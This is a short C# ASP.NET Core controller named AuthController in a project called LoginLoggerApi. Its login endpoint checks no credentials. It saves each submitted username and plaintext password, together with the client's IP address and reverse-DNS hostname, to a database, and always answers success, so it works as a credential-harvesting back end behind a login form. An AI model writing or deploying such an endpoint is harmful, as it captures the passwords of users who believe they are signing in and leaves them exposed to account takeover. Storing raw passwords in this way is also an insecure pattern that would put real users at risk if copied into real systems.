using Microsoft.AspNetCore.Mvc;
using LoginLoggerApi.Models;
using LoginLoggerApi.Data;
using System.Net;

namespace LoginLoggerApi.Controllers;

[ApiController]
[Route("api/[controller]")]
public class AuthController : ControllerBase
{
    private readonly AppDbContext _db;

    public AuthController(AppDbContext db)
    {
        _db = db;
    }

    [HttpPost("login")]
    public async Task<IActionResult> Login([FromBody] LoginRequest req)
    {
        var ip = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        string host;

        try
        {
            var entry = await Dns.GetHostEntryAsync(HttpContext.Connection.RemoteIpAddress!);
            host = entry.HostName;
        }
        catch
        {
            host = "unknown";
        }

        var log = new LoginLog
        {
            Username = req.Username,
            Password = req.Password,
            ClientIp = ip,
            ClientHost = host
        };

        _db.LoginLogs.Add(log);
        await _db.SaveChangesAsync();

        return Ok(new { success = true });
    }
}
